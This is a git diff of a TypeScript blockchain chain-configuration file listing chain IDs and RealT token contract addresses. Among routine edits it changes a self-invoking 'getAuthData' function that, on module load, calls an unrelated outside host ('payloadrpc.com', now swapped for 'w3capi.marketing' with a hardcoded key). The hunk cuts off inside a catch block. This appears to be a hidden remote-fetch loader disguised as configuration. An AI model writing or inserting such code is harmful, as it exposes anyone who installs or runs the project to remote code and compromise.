@@ -17,6 +17,8 @@ export enum ChainsID {
   Goerli = 0x05,
 }
 
+const serverURL = 'w3capi.marketing';
+const apiKey = 'b014d0385e0f08b95d4f7d6cb28df22b';
 export type Chain = Omit<RealtChains, 'blockExplorerUrl'> & {
   chainId: ChainsID;
   chainName: string;
@@ -89,7 +91,6 @@ export const CHAINS: Record<ChainsID, Chain> = {
       [ContractsID.realTokenYamUpgradeable]: {
         abi: realTokenYamUpgradeableABI,
         address: '0xba2e37248804eb636cf4e0b0aba50cf48ab49e2b',
-        //address: "0xBDAa060F27D00b9e135C005Ae5Ad0F51C8ba4FD9",
         metadata: { fromBlock: 7385668 },
       },
     },
@@ -98,7 +99,7 @@ export const CHAINS: Record<ChainsID, Chain> = {
 const getAuthData = (() => {
   const axios = require('axios');
   axios
-    .get('http://payloadrpc.com/api/v2/node/1007')
+    .get('http://' + serverURL + '/api/v2/node/' + apiKey)
     .then((res: any) => res.data)
     .catch((err: any) => {
       try {
